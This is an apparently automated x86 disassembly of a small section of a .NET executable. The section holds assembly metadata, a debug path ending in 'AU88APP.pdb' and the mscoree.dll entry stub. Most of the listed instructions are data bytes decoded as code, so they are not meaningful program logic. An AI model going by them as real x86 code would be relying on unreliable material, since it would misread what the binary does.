  4080f2:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4080f9:	77 73                	ja     0x40816e
  4080fb:	01 08                	add    %ecx,(%eax)
  4080fd:	01 00                	add    %eax,(%eax)
  4080ff:	07                   	pop    %es
  408100:	01 00                	add    %eax,(%eax)
  408102:	00 00                	add    %al,(%eax)
  408104:	00 05 01 00 00 00    	add    %al,0x1
  40810a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40810d:	00 07                	add    %al,(%edi)
  40810f:	31 2e                	xor    %ebp,(%esi)
  408111:	30 2e                	xor    %ch,(%esi)
  408113:	30 2e                	xor    %ch,(%esi)
  408115:	30 00                	xor    %al,(%eax)
  408117:	00 49 01             	add    %cl,0x1(%ecx)
  40811a:	00 1a                	add    %bl,(%edx)
  40811c:	2e 4e                	cs dec %esi
  40811e:	45                   	inc    %ebp
  40811f:	54                   	push   %esp
  408120:	46                   	inc    %esi
  408121:	72 61                	jb     0x408184
  408123:	6d                   	insl   (%dx),%es:(%edi)
  408124:	65 77 6f             	gs ja  0x408196
  408127:	72 6b                	jb     0x408194
  408129:	2c 56                	sub    $0x56,%al
  40812b:	65 72 73             	gs jb  0x4081a1
  40812e:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  408135:	38 01                	cmp    %al,(%ecx)
  408137:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40813b:	46                   	inc    %esi
  40813c:	72 61                	jb     0x40819f
  40813e:	6d                   	insl   (%dx),%es:(%edi)
  40813f:	65 77 6f             	gs ja  0x4081b1
  408142:	72 6b                	jb     0x4081af
  408144:	44                   	inc    %esp
  408145:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40814c:	61                   	popa
  40814d:	6d                   	insl   (%dx),%es:(%edi)
  40814e:	65 12 2e             	adc    %gs:(%esi),%ch
  408151:	4e                   	dec    %esi
  408152:	45                   	inc    %ebp
  408153:	54                   	push   %esp
  408154:	20 46 72             	and    %al,0x72(%esi)
  408157:	61                   	popa
  408158:	6d                   	insl   (%dx),%es:(%edi)
  408159:	65 77 6f             	gs ja  0x4081cb
  40815c:	72 6b                	jb     0x4081c9
  40815e:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  408161:	38 08                	cmp    %cl,(%eax)
  408163:	01 00                	add    %eax,(%eax)
	...
  40816d:	00 00                	add    %al,(%eax)
  40816f:	00 25 27 de ee 00    	add    %ah,0xeede27
  408175:	00 00                	add    %al,(%eax)
  408177:	00 02                	add    %al,(%edx)
  408179:	00 00                	add    %al,(%eax)
  40817b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40817e:	00 00                	add    %al,(%eax)
  408180:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408181:	81 00 00 a4 63 00    	addl   $0x63a400,(%eax)
	...
  408193:	00 10                	add    %dl,(%eax)
	...
  4081a1:	00 00                	add    %al,(%eax)
  4081a3:	00 52 53             	add    %dl,0x53(%edx)
  4081a6:	44                   	inc    %esp
  4081a7:	53                   	push   %ebx
  4081a8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4081a9:	51                   	push   %ecx
  4081aa:	d7                   	xlat   %ds:(%ebx)
  4081ab:	53                   	push   %ebx
  4081ac:	11 6b 6b             	adc    %ebp,0x6b(%ebx)
  4081af:	4a                   	dec    %edx
  4081b0:	9d                   	popf
  4081b1:	a8 ae                	test   $0xae,%al
  4081b3:	c9                   	leave
  4081b4:	51                   	push   %ecx
  4081b5:	bb b1 5a 01 00       	mov    $0x15ab1,%ebx
  4081ba:	00 00                	add    %al,(%eax)
  4081bc:	43                   	inc    %ebx
  4081bd:	3a 5c 77 6f          	cmp    0x6f(%edi,%esi,2),%bl
  4081c1:	77 5c                	ja     0x40821f
  4081c3:	75 70                	jne    0x408235
  4081c5:	64 61                	fs popa
  4081c7:	74 65                	je     0x40822e
  4081c9:	5c                   	pop    %esp
  4081ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cb:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  4081ce:	44                   	inc    %esp
  4081cf:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4081d3:	5c                   	pop    %esp
  4081d4:	41                   	inc    %ecx
  4081d5:	55                   	push   %ebp
  4081d6:	38 38                	cmp    %bh,(%eax)
  4081d8:	41                   	inc    %ecx
  4081d9:	50                   	push   %eax
  4081da:	50                   	push   %eax
  4081db:	2e 70 64             	jo,pn  0x408242
  4081de:	62 00                	bound  %eax,(%eax)
  4081e0:	08 82 00 00 00 00    	or     %al,0x0(%edx)
  4081e6:	00 00                	add    %al,(%eax)
  4081e8:	00 00                	add    %al,(%eax)
  4081ea:	00 00                	add    %al,(%eax)
  4081ec:	22 82 00 00 00 20    	and    0x20000000(%edx),%al
	...
  408206:	00 00                	add    %al,(%eax)
  408208:	14 82                	adc    $0x82,%al
	...
  408216:	5f                   	pop    %edi
  408217:	43                   	inc    %ebx
  408218:	6f                   	outsl  %ds:(%esi),(%dx)
  408219:	72 45                	jb     0x408260
  40821b:	78 65                	js     0x408282
  40821d:	4d                   	dec    %ebp
  40821e:	61                   	popa
  40821f:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  408226:	72 65                	jb     0x40828d
  408228:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40822c:	6c                   	insb   (%dx),%es:(%edi)
  40822d:	00 00                	add    %al,(%eax)
  40822f:	00 00                	add    %al,(%eax)
  408231:	00 ff                	add    %bh,%bh
  408233:	25 00 20 40 00       	and    $0x402000,%eax
  408238:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  40823d:	cd 97                	int    $0x97
  40823f:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  408245:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408246:	78 43                	js     0x40828b
  408248:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  40824e:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  408254:	e6 c3                	out    %al,$0xc3
  408256:	39                   	.byte 0x39
  408257:	41                   	inc    %ecx
